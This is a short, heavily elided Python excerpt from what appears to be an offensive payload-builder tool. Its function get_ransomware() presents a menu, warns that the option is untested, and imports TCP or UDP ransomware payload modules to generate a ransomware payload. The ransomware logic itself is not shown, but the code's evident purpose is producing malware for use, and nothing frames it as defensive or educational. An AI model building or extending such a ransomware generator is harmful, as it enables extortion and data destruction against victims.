...
def get_ransomware():
    ...
    print("Im telling again . this option was not tested and may cause unexpected events")

    print(
        "A " + red + "Ransomware" + reset + " ?"
    ...
    if choice == "000":
        ...
        if victim_os == "000":
            ...
            if choice == 'TCP':
                import core.lib.payloads.ransomware.tcp as r # pylint: disable=C0415; # noqa
            elif choice == 'UDP':
                import core.lib.payloads.ransomware.udp as r # pylint: disable=C0415; # noqa

            return (r._get_ransomware( # pylint: disable=W0212; # noqa
